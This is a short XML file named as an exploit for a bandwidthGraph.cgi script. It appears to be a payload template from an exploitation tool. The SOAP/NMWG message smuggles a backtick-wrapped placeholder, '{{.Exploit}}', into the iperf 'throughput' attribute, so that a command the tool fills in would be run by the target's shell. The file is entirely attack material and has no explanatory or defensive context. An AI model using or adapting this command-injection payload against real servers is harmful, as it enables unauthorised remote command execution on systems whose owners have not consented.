bandwidthGraph.cgi/exploit.xml

<?xml version='1.0' encoding='utf8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" >
  <SOAP-ENV:Header />
  <SOAP-ENV:Body>
    <nmwg:message xmlns:nmwg="http://ggf.org/ns/nmwg/base/2.0/">
      <nmwg:metadata id="metadata.1337">
        <nmwg:eventType>success.test</nmwg:eventType>
      </nmwg:metadata>
      <nmwg:data metadataIdRef="metadata.1337">
        <iperf:datum throughput="`{{.Exploit}}`" timeValue="1 1 1 1:1:1  1" xmlns:iperf="http://ggf.org/ns/nmwg/tools/iperf/2.0/" />
      </nmwg:data>
    </nmwg:message>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>